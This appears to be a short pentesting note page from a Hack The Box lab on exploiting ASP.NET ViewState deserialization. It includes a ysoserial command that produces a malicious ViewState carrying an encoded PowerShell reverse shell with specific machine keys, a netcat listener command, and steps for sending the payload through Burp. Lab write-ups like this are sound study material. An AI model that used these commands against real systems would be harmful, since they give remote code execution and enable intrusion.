# ViewState

**ViewState** is the method that the ASP.NET framework uses by default to p**reserve page and control values between web pages**. When the HTML for the page is rendered, the current state of the page and values that need to be retained during postback are serialized into base64-encoded strings and output in the ViewState hidden field or fields.

{% embed url="https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter" %}

{% embed url="https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/" %}

### Hack the box - Viewstate attack&#x20;

{% code overflow="wrap" %}
```bash
# Assume that you have already idenfied the machine key information. 

<machineKey validationKey="[String]"  decryptionKey="[String]" validation="[SHA1 | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]"  decryption="[Auto | DES | 3DES | AES | alg:algorithm_name]" />

# Create a malicious viewstate payload
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell -e <your encoded reverse shell>" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```
{% endcode %}

### Send it via BURP

Listener

```bash
kali> rlwrap nc -nlvp 1234 
```

Copy the output of ysoserial to the \_VIEWSTATE parameter value, and click on 'Send'.&#x20;

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

